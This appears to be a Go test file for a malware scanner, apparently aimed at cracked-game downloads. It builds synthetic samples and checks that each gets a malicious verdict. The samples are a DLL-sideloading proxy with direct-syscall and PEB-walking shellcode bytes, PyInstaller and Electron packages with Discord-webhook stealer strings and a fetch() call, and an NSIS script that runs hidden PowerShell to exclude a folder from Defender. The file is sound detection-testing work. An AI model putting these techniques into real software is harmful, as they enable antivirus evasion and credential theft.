package scan

import (
	"bytes"
	"compress/zlib"
	"debug/pe"
	"encoding/binary"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gamecrack-scanner/internal/model"
)

// buildMinimalPE64 constructs a valid 64-bit PE file (EXE or DLL) in memory with
// custom code bytes, optional export forwarding ("version_orig.GetFileVersionInfoW"),
// and an optional overlay appended after the section data.
func buildMinimalPE64(t *testing.T, isDLL bool, code []byte, forwardExports bool, overlay []byte) []byte {
	t.Helper()
	const (
		fileAlign = 0x200
		secAlign  = 0x1000
	)
	buf := make([]byte, 0x400)
	buf[0] = 'M'
	buf[1] = 'Z'
	binary.LittleEndian.PutUint32(buf[0x3C:0x40], 0x80)

	nt := 0x80
	copy(buf[nt:nt+4], []byte{'P', 'E', 0, 0})
	fh := nt + 4
	binary.LittleEndian.PutUint16(buf[fh+0:fh+2], 0x8664) // AMD64
	numSecs := uint16(1)
	if forwardExports {
		numSecs = 2
	}
	binary.LittleEndian.PutUint16(buf[fh+2:fh+4], numSecs)
	binary.LittleEndian.PutUint16(buf[fh+16:fh+18], 240) // SizeOfOptionalHeader (PE32+)
	chars := uint16(0x0022)                              // EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
	if isDLL {
		chars |= 0x2000
	}
	binary.LittleEndian.PutUint16(buf[fh+18:fh+20], chars)

	oh := fh + 20
	binary.LittleEndian.PutUint16(buf[oh+0:oh+2], 0x20B)       // PE32+
	binary.LittleEndian.PutUint32(buf[oh+16:oh+20], 0x1000)    // AddressOfEntryPoint
	binary.LittleEndian.PutUint32(buf[oh+20:oh+24], 0x1000)    // BaseOfCode
	binary.LittleEndian.PutUint64(buf[oh+24:oh+32], 0x1400000) // ImageBase
	binary.LittleEndian.PutUint32(buf[oh+32:oh+36], secAlign)
	binary.LittleEndian.PutUint32(buf[oh+36:oh+40], fileAlign)
	binary.LittleEndian.PutUint16(buf[oh+40:oh+42], 6)
	sizeOfImage := uint32(0x2000)
	if forwardExports {
		sizeOfImage = 0x3000
	}
	binary.LittleEndian.PutUint32(buf[oh+56:oh+60], sizeOfImage)
	binary.LittleEndian.PutUint32(buf[oh+60:oh+64], 0x400) // SizeOfHeaders
	binary.LittleEndian.PutUint16(buf[oh+68:oh+70], 3)     // CONSOLE
	binary.LittleEndian.PutUint32(buf[oh+108:oh+112], 16)  // NumberOfRvaAndSizes

	ddOff := oh + 112
	var edataRaw []byte
	if forwardExports {
		// Export Directory at RVA 0x2000, size 0x100
		binary.LittleEndian.PutUint32(buf[ddOff+0:ddOff+4], 0x2000)
		binary.LittleEndian.PutUint32(buf[ddOff+4:ddOff+8], 0x100)

		edataRaw = make([]byte, 0x200)
		// IMAGE_EXPORT_DIRECTORY (40 bytes): NumberOfFunctions=2 at [20:24], AddressOfFunctions=0x2028 at [28:32]
		binary.LittleEndian.PutUint32(edataRaw[20:24], 2)
		binary.LittleEndian.PutUint32(edataRaw[28:32], 0x2028)
		// Function RVAs pointing INSIDE [0x2000, 0x2100) = AheadLib export forwarders!
		binary.LittleEndian.PutUint32(edataRaw[0x28:0x2C], 0x2040)
		binary.LittleEndian.PutUint32(edataRaw[0x2C:0x30], 0x2070)
		copy(edataRaw[0x40:], []byte("version_orig.GetFileVersionInfoW\x00"))
		copy(edataRaw[0x70:], []byte("version_orig.VerQueryValueW\x00"))
	}

	secTable := oh + 240
	codeRawLen := ((len(code) + fileAlign - 1) / fileAlign) * fileAlign
	if codeRawLen == 0 {
		codeRawLen = fileAlign
	}
	codePadded := make([]byte, codeRawLen)
	copy(codePadded, code)

	// Section 1: .text
	copy(buf[secTable+0:secTable+8], []byte(".text\x00\x00\x00"))
	binary.LittleEndian.PutUint32(buf[secTable+8:secTable+12], uint32(len(codePadded)))
	binary.LittleEndian.PutUint32(buf[secTable+12:secTable+16], 0x1000)
	binary.LittleEndian.PutUint32(buf[secTable+16:secTable+20], uint32(len(codePadded)))
	binary.LittleEndian.PutUint32(buf[secTable+20:secTable+24], 0x400)
	binary.LittleEndian.PutUint32(buf[secTable+36:secTable+40], pe.IMAGE_SCN_CNT_CODE|pe.IMAGE_SCN_MEM_EXECUTE|pe.IMAGE_SCN_MEM_READ)

	var out bytes.Buffer
	if forwardExports {
		sec2 := secTable + 40
		copy(buf[sec2+0:sec2+8], []byte(".edata\x00\x00"))
		binary.LittleEndian.PutUint32(buf[sec2+8:sec2+12], uint32(len(edataRaw)))
		binary.LittleEndian.PutUint32(buf[sec2+12:sec2+16], 0x2000)
		binary.LittleEndian.PutUint32(buf[sec2+16:sec2+20], uint32(len(edataRaw)))
		binary.LittleEndian.PutUint32(buf[sec2+20:sec2+24], uint32(0x400+len(codePadded)))
		binary.LittleEndian.PutUint32(buf[sec2+36:sec2+40], pe.IMAGE_SCN_CNT_INITIALIZED_DATA|pe.IMAGE_SCN_MEM_READ)
	}

	out.Write(buf)
	out.Write(codePadded)
	if forwardExports {
		out.Write(edataRaw)
	}
	if len(overlay) > 0 {
		out.Write(overlay)
	}
	return out.Bytes()
}

func TestDLLSideloadAndDirectSyscallDetection(t *testing.T) {
	// Code with 2 direct syscall stubs + PEB->LDR shellcode walk.
	code := []byte{
		0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3,
		0x4C, 0x8B, 0xD1, 0xB8, 0x55, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3,
		0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
		0x48, 0x8B, 0x40, 0x18,
		0x48, 0x8B, 0x70, 0x20,
		0xC3,
	}
	raw := buildMinimalPE64(t, true, code, true, nil)
	dllPath := filepath.Join(t.TempDir(), "version.dll")
	if err := os.WriteFile(dllPath, raw, 0o644); err != nil {
		t.Fatal(err)
	}

	res, _, err := ScanOne(Config{ExtractDepth: 1, ExtractMaxMB: 50, TempDir: t.TempDir()}, dllPath)
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != model.VerdictMalicious {
		t.Fatalf("sideload proxy version.dll verdict = %s (score=%d), want MALICIOUS; findings=%+v", res.Verdict, res.Score, res.Findings)
	}
	wantRules := []string{"dll_sideload_proxy", "direct_syscall_stubs", "peb_ldr_shellcode"}
	for _, wr := range wantRules {
		found := false
		for _, f := range res.Findings {
			if f.Rule == wr {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("missing expected rule %q in findings: %+v", wr, res.Findings)
		}
	}
}

func TestPyInstallerAndAsarEndToEndScan(t *testing.T) {
	tmp := t.TempDir()

	// 1. Synthetic PyInstaller .exe hiding a Discord webhook + Chrome ABE stealer inside zlib bytecode.
	var zbuf bytes.Buffer
	zw := zlib.NewWriter(&zbuf)
	zw.Write([]byte("WEBHOOK='https://discord.com/api/webhooks/123456789012345678/" + strings.Repeat("aB3-_", 14) + "'\nKEY='app_bound_encrypted_key'\n"))
	zw.Close()
	comp := zbuf.Bytes()

	nameBytes := append([]byte("game_launcher"), 0)
	if rem := (18 + len(nameBytes)) % 16; rem != 0 {
		nameBytes = append(nameBytes, bytes.Repeat([]byte{0}, 16-rem)...)
	}
	toc := make([]byte, 18+len(nameBytes))
	binary.BigEndian.PutUint32(toc[0:4], uint32(len(toc)))
	binary.BigEndian.PutUint32(toc[4:8], 0)
	binary.BigEndian.PutUint32(toc[8:12], uint32(len(comp)))
	binary.BigEndian.PutUint32(toc[12:16], 256)
	toc[16] = 1
	toc[17] = 's'
	copy(toc[18:], nameBytes)

	cookie := make([]byte, 88)
	copy(cookie[0:8], []byte{'M', 'E', 'I', 0x0c, 0x0b, 0x0a, 0x0b, 0x0e})
	binary.BigEndian.PutUint32(cookie[8:12], uint32(len(comp)+len(toc)+len(cookie)))
	binary.BigEndian.PutUint32(cookie[12:16], uint32(len(comp)))
	binary.BigEndian.PutUint32(cookie[16:20], uint32(len(toc)))
	binary.BigEndian.PutUint32(cookie[20:24], 311)
	copy(cookie[24:], []byte("python311.dll\x00"))

	var overlay bytes.Buffer
	overlay.Write(comp)
	overlay.Write(toc)
	overlay.Write(cookie)

	pyExe := filepath.Join(tmp, "Launcher.exe")
	if err := os.WriteFile(pyExe, buildMinimalPE64(t, false, []byte{0xC3}, false, overlay.Bytes()), 0o644); err != nil {
		t.Fatal(err)
	}
	pyRes, _, err := ScanOne(Config{ExtractDepth: 2, ExtractMaxMB: 50, TempDir: tmp}, pyExe)
	if err != nil {
		t.Fatal(err)
	}
	if pyRes.Verdict != model.VerdictMalicious {
		t.Fatalf("PyInstaller stealer verdict = %s (score=%d), want MALICIOUS; findings=%+v", pyRes.Verdict, pyRes.Score, pyRes.Findings)
	}

	// 2. Synthetic Electron app.asar containing a JS stealer.
	jsPayload := []byte(`fetch("https://discord.com/api/webhooks/123456789012345678/` + strings.Repeat("Z9x_-", 14) + `"); const k = "app_bound_encrypted_key";`)
	hdrMap := map[string]any{
		"files": map[string]any{
			"index.js": map[string]any{"size": len(jsPayload), "offset": "0"},
		},
	}
	jb, _ := json.Marshal(hdrMap)
	aligned := (len(jb) + 3) & ^3
	padded := make([]byte, aligned)
	copy(padded, jb)
	var asarBuf bytes.Buffer
	var pre [16]byte
	binary.LittleEndian.PutUint32(pre[0:4], 4)
	binary.LittleEndian.PutUint32(pre[4:8], uint32(8+aligned))
	binary.LittleEndian.PutUint32(pre[8:12], uint32(4+aligned))
	binary.LittleEndian.PutUint32(pre[12:16], uint32(len(jb)))
	asarBuf.Write(pre[:])
	asarBuf.Write(padded)
	asarBuf.Write(jsPayload)

	asarPath := filepath.Join(tmp, "app.asar")
	if err := os.WriteFile(asarPath, asarBuf.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	asarRes, _, err := ScanOne(Config{ExtractDepth: 2, ExtractMaxMB: 50, TempDir: tmp}, asarPath)
	if err != nil {
		t.Fatal(err)
	}
	if asarRes.Verdict != model.VerdictMalicious {
		t.Fatalf("Electron app.asar stealer verdict = %s (score=%d), want MALICIOUS; findings=%+v", asarRes.Verdict, asarRes.Score, asarRes.Findings)
	}

	// 3. NSIS script (.nsi) with hidden PowerShell Defender tamper cradle.
	nsiPath := filepath.Join(tmp, "setup.nsi")
	os.WriteFile(nsiPath, []byte(`Section "Main"
  nsExec::ExecToStack 'powershell.exe -w hidden -Command "Add-MpPreference -ExclusionPath C:\Games"'
SectionEnd`), 0o644)
	nsiRes, _, err := ScanOne(Config{ExtractDepth: 1, ExtractMaxMB: 50, TempDir: tmp}, nsiPath)
	if err != nil {
		t.Fatal(err)
	}
	if nsiRes.Verdict != model.VerdictMalicious {
		t.Fatalf("NSIS malicious script verdict = %s (score=%d), want MALICIOUS; findings=%+v", nsiRes.Verdict, nsiRes.Score, nsiRes.Findings)
	}
}
